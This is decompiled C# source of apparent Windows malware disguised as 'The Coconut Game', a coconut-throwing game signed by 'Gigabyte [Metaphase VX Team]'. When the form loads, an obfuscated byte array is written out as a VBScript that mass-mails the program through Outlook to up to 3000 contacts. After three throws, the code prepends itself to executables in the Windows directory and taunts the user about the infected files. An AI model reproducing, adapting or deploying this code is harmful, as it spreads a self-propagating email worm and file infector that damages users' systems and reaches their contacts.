using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Resources;
using System.Windows.Forms;

namespace coconut;

public class Form1 : Form
{
	public int throw_turn = 0;

	public int score = 0;

	public Random rand_numb = new Random();

	public string virname = Application.get_ExecutablePath();

	private Button button1;

	private PictureBox coco;

	private PictureBox cluley;

	private PictureBox redattack;

	private PictureBox cl_coco;

	private PictureBox red_coco;

	private PictureBox ms_coco;

	private Label label1;

	private Label label2;

	private Container components = null;

	public Form1()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_017f: Expected O, but got Unknown
		//IL_0277: Unknown result type (might be due to invalid IL or missing references)
		//IL_0281: Expected O, but got Unknown
		//IL_0304: Unknown result type (might be due to invalid IL or missing references)
		//IL_030e: Expected O, but got Unknown
		//IL_0391: Unknown result type (might be due to invalid IL or missing references)
		//IL_039b: Expected O, but got Unknown
		ResourceManager resourceManager = new ResourceManager(typeof(Form1));
		coco = new PictureBox();
		cluley = new PictureBox();
		redattack = new PictureBox();
		button1 = new Button();
		cl_coco = new PictureBox();
		red_coco = new PictureBox();
		ms_coco = new PictureBox();
		label1 = new Label();
		label2 = new Label();
		((Control)this).SuspendLayout();
		((Control)coco).set_BackColor(Color.White);
		coco.set_Image((Image)(Bitmap)resourceManager.GetObject("coco.Image"));
		((Control)coco).set_Location(new Point(0, 88));
		((Control)coco).set_Name("coco");
		((Control)coco).set_Size(new Size(104, 96));
		coco.set_TabIndex(0);
		coco.set_TabStop(false);
		cluley.set_Image((Image)(Bitmap)resourceManager.GetObject("cluley.Image"));
		((Control)cluley).set_Location(new Point(352, 176));
		((Control)cluley).set_Name("cluley");
		((Control)cluley).set_Size(new Size(80, 104));
		cluley.set_TabIndex(1);
		cluley.set_TabStop(false);
		redattack.set_Image((Image)(Bitmap)resourceManager.GetObject("redattack.Image"));
		((Control)redattack).set_Location(new Point(176, 176));
		((Control)redattack).set_Name("redattack");
		((Control)redattack).set_Size(new Size(104, 104));
		redattack.set_TabIndex(2);
		redattack.set_TabStop(false);
		((Control)button1).set_BackColor(Color.LightGray);
		((Control)button1).set_Location(new Point(208, 40));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(168, 48));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Throw!");
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)cl_coco).set_BackColor(Color.White);
		cl_coco.set_Image((Image)(Bitmap)resourceManager.GetObject("cl_coco.Image"));
		((Control)cl_coco).set_Location(new Point(336, 176));
		((Control)cl_coco).set_Name("cl_coco");
		((Control)cl_coco).set_Size(new Size(104, 96));
		cl_coco.set_TabIndex(4);
		cl_coco.set_TabStop(false);
		((Control)cl_coco).set_Visible(false);
		((Control)red_coco).set_BackColor(Color.White);
		red_coco.set_Image((Image)(Bitmap)resourceManager.GetObject("red_coco.Image"));
		((Control)red_coco).set_Location(new Point(176, 176));
		((Control)red_coco).set_Name("red_coco");
		((Control)red_coco).set_Size(new Size(104, 96));
		red_coco.set_TabIndex(5);
		red_coco.set_TabStop(false);
		((Control)red_coco).set_Visible(false);
		((Control)ms_coco).set_BackColor(Color.White);
		ms_coco.set_Image((Image)(Bitmap)resourceManager.GetObject("ms_coco.Image"));
		((Control)ms_coco).set_Location(new Point(496, 176));
		((Control)ms_coco).set_Name("ms_coco");
		((Control)ms_coco).set_Size(new Size(104, 96));
		ms_coco.set_TabIndex(6);
		ms_coco.set_TabStop(false);
		((Control)ms_coco).set_Visible(false);
		((Control)label1).set_Location(new Point(136, 144));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(184, 24));
		((Control)label1).set_TabIndex(7);
		((Control)label1).set_Text("Frans Devaere aka \"ReDaTtAcK\"");
		((Control)label2).set_Location(new Point(352, 144));
		((Control)label2).set_Name("label2");
		((Control)label2).set_TabIndex(8);
		((Control)label2).set_Text("Graham Cluley");
		((Form)this).set_AutoScaleBaseSize(new Size(5, 13));
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(600, 270));
		((Control)this).get_Controls().AddRange((Control[])(object)new Control[9]
		{
			(Control)label2,
			(Control)label1,
			(Control)ms_coco,
			(Control)red_coco,
			(Control)cl_coco,
			(Control)button1,
			(Control)redattack,
			(Control)cluley,
			(Control)coco
		});
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("The Coconut Game");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	[STAThread]
	private static void Main()
	{
		Application.Run((Form)(object)new Form1());
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		byte[] array = new byte[685]
		{
			79, 110, 32, 69, 114, 114, 111, 114, 32, 82,
			101, 115, 117, 109, 101, 32, 78, 101, 120, 116,
			13, 10, 68, 105, 109, 32, 99, 111, 99, 111,
			110, 117, 116, 44, 32, 77, 97, 105, 108, 44,
			32, 67, 111, 117, 110, 116, 101, 114, 44, 32,
			65, 44, 32, 66, 44, 32, 67, 44, 32, 68,
			44, 32, 69, 13, 10, 83, 101, 116, 32, 99,
			111, 99, 111, 110, 117, 116, 32, 61, 32, 67,
			114, 101, 97, 116, 101, 79, 98, 106, 101, 99,
			116, 32, 40, 34, 111, 117, 116, 108, 111, 111,
			107, 46, 97, 112, 112, 108, 105, 99, 97, 116,
			105, 111, 110, 34, 41, 13, 10, 83, 101, 116,
			32, 77, 97, 105, 108, 32, 61, 32, 99, 111,
			99, 111, 110, 117, 116, 46, 71, 101, 116, 78,
			97, 109, 101, 83, 112, 97, 99, 101, 32, 40,
			34, 77, 65, 80, 73, 34, 41, 13, 10, 70,
			111, 114, 32, 65, 32, 61, 32, 49, 32, 84,
			111, 32, 77, 97, 105, 108, 46, 65, 100, 100,
			114, 101, 115, 115, 76, 105, 115, 116, 115, 46,
			67, 111, 117, 110, 116, 13, 10, 83, 101, 116,
			32, 66, 32, 61, 32, 77, 97, 105, 108, 46,
			65, 100, 100, 114, 101, 115, 115, 76, 105, 115,
			116, 115, 32, 40, 65, 41, 13, 10, 67, 111,
			117, 110, 116, 101, 114, 32, 61, 32, 49, 13,
			10, 83, 101, 116, 32, 67, 32, 61, 32, 99,
			111, 99, 111, 110, 117, 116, 46, 67, 114, 101,
			97, 116, 101, 73, 116, 101, 109, 32, 40, 48,
			41, 13, 10, 70, 111, 114, 32, 68, 32, 61,
			32, 49, 32, 84, 111, 32, 66, 46, 65, 100,
			100, 114, 101, 115, 115, 69, 110, 116, 114, 105,
			101, 115, 46, 67, 111, 117, 110, 116, 13, 10,
			69, 32, 61, 32, 66, 46, 65, 100, 100, 114,
			101, 115, 115, 69, 110, 116, 114, 105, 101, 115,
			32, 40, 67, 111, 117, 110, 116, 101, 114, 41,
			13, 10, 67, 46, 82, 101, 99, 105, 112, 105,
			101, 110, 116, 115, 46, 65, 100, 100, 32, 69,
			13, 10, 67, 111, 117, 110, 116, 101, 114, 32,
			61, 32, 67, 111, 117, 110, 116, 101, 114, 32,
			43, 32, 49, 13, 10, 73, 102, 32, 67, 111,
			117, 110, 116, 101, 114, 32, 62, 32, 51, 48,
			48, 48, 32, 84, 104, 101, 110, 32, 69, 120,
			105, 116, 32, 70, 111, 114, 13, 10, 78, 101,
			120, 116, 13, 10, 67, 46, 83, 117, 98, 106,
			101, 99, 116, 32, 61, 32, 34, 84, 104, 101,
			32, 67, 111, 99, 111, 110, 117, 116, 32, 71,
			97, 109, 101, 34, 13, 10, 67, 46, 66, 111,
			100, 121, 32, 61, 32, 34, 84, 104, 105, 115,
			32, 103, 97, 109, 101, 32, 109, 97, 100, 101,
			32, 109, 101, 32, 102, 101, 101, 108, 32, 108,
			105, 107, 101, 32, 73, 32, 119, 97, 115, 32,
			111, 110, 32, 97, 32, 118, 97, 99, 97, 116,
			105, 111, 110, 32, 58, 41, 34, 13, 10, 67,
			46, 65, 116, 116, 97, 99, 104, 109, 101, 110,
			116, 115, 46, 65, 100, 100, 32, 34, 99, 58,
			92, 99, 111, 99, 111, 110, 117, 116, 46, 101,
			120, 101, 34, 13, 10, 67, 46, 68, 101, 108,
			101, 116, 101, 65, 102, 116, 101, 114, 83, 117,
			98, 109, 105, 116, 32, 61, 32, 84, 114, 117,
			101, 13, 10, 67, 46, 83, 101, 110, 100, 13,
			10, 78, 101, 120, 116, 13, 10, 83, 101, 116,
			32, 67, 32, 61, 32, 67, 114, 101, 97, 116,
			101, 79, 98, 106, 101, 99, 116, 32, 40, 34,
			83, 99, 114, 105, 112, 116, 105, 110, 103, 46,
			70, 105, 108, 101, 83, 121, 115, 116, 101, 109,
			79, 98, 106, 101, 99, 116, 34, 41, 13, 10,
			67, 46, 68, 101, 108, 101, 116, 101, 70, 105,
			108, 101, 32, 87, 115, 99, 114, 105, 112, 116,
			46, 83, 99, 114, 105, 112, 116, 70, 117, 108,
			108, 78, 97, 109, 101
		};
		FileStream fileStream = new FileStream("c:\\mail.vbs", FileMode.OpenOrCreate, FileAccess.Write);
		fileStream.Write(array, 0, array.Length);
		fileStream.Close();
		if (!File.Exists("c:\\coconut.exe"))
		{
			Process process = new Process();
			File.Copy(virname, "c:\\tmpvir.exe", overwrite: true);
			FileStream fileStream2 = new FileStream("c:\\tmpvir.exe", FileMode.Open);
			FileStream fileStream3 = new FileStream("c:\\coconut.exe", FileMode.OpenOrCreate);
			byte[] buffer = new byte[200704];
			fileStream2.Read(buffer, 0, 200704);
			fileStream3.Write(buffer, 0, 200704);
			fileStream2.Close();
			fileStream3.Close();
			File.Delete("c:\\tmpvir.exe");
			process.StartInfo.FileName = "c:\\mail.vbs";
			process.Start();
		}
		else
		{
			File.Copy(virname, "c:\\tmpvir.exe", overwrite: true);
			FileStream fileStream4 = new FileStream("c:\\tmpvir.exe", FileMode.Open);
			FileStream fileStream5 = new FileStream("c:\\coconut.exe", FileMode.OpenOrCreate);
			byte[] buffer2 = new byte[200704];
			fileStream4.Read(buffer2, 0, 200704);
			fileStream5.Write(buffer2, 0, 200704);
			fileStream4.Close();
			fileStream5.Close();
			File.Delete("c:\\tmpvir.exe");
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		int num = rand_numb.Next(3);
		throw_turn++;
		((Control)coco).set_Visible(false);
		switch (num)
		{
		case 0:
			((Control)ms_coco).set_Visible(true);
			MessageBox.Show("You missed! You earned 0 points.");
			((Control)ms_coco).set_Visible(false);
			break;
		case 1:
			((Control)red_coco).set_Visible(true);
			MessageBox.Show("You hit Frans Devaere! You earned 1 point.");
			((Control)red_coco).set_Visible(false);
			score++;
			break;
		default:
			((Control)cl_coco).set_Visible(true);
			MessageBox.Show("You hit Graham Cluley! You earned 2 points.");
			((Control)cl_coco).set_Visible(false);
			score += 2;
			break;
		}
		((Control)coco).set_Visible(true);
		if (throw_turn != 3)
		{
			return;
		}
		string fullName = new DirectoryInfo(Environment.SystemDirectory).Parent!.FullName;
		FileSearch(fullName);
		MessageBox.Show("In total, you have " + score + " point(s). Therefore, I have infected " + (6 - score) + " files on your computer. To be able to run these files, you'll first have to play this game again.\nHave a nice day, \n\nGigabyte [Metaphase VX Team]");
		FileStream fileStream = new FileStream(virname, FileMode.Open, FileAccess.Read);
		FileStream fileStream2 = new FileStream("temp.exe", FileMode.OpenOrCreate);
		byte[] buffer;
		checked
		{
			buffer = new byte[(uint)unchecked((int)fileStream.Length - 200704)];
			fileStream.Seek(200704L, SeekOrigin.Begin);
		}
		fileStream.Read(buffer, 0, (int)fileStream.Length - 200704);
		fileStream2.Write(buffer, 0, (int)fileStream.Length - 200704);
		long length = fileStream2.Length;
		fileStream2.Close();
		if (length > 0L && !virname.EndsWith("coconut.exe"))
		{
			Process process = new Process();
			process.StartInfo.FileName = "temp.exe";
			process.Start();
		}
		while (File.Exists("temp.exe"))
		{
			try
			{
				File.Delete("temp.exe");
			}
			catch
			{
			}
		}
		Application.Exit();
	}

	private void FileSearch(string DirectoryToCheck)
	{
		string[] files = Directory.GetFiles(DirectoryToCheck, "*.exe");
		int num = files.Length;
		int num2 = rand_numb.Next(num - 6);
		for (int i = num2; i < num2 + (6 - score); i++)
		{
			string text = files[i];
			FileStream fileStream = new FileStream(text, FileMode.Open, FileAccess.Read);
			fileStream.Seek(18L, SeekOrigin.Begin);
			int num3 = fileStream.ReadByte();
			fileStream.Close();
			if (num3 != 103)
			{
				try
				{
					File.SetAttributes(text, FileAttributes.Normal);
					File.Copy(text, "hostcopy.exe", overwrite: true);
					File.Copy("c:\\coconut.exe", text, overwrite: true);
					FileStream fileStream2 = new FileStream("hostcopy.exe", FileMode.Open);
					FileStream fileStream3 = new FileStream(text, FileMode.Append);
					byte[] buffer;
					checked
					{
						buffer = new byte[(uint)unchecked((int)fileStream2.Length)];
					}
					fileStream2.Read(buffer, 0, (int)fileStream2.Length);
					fileStream3.Write(buffer, 0, (int)fileStream2.Length);
					fileStream2.Close();
					fileStream3.Close();
				}
				catch
				{
				}
			}
		}
	}
}
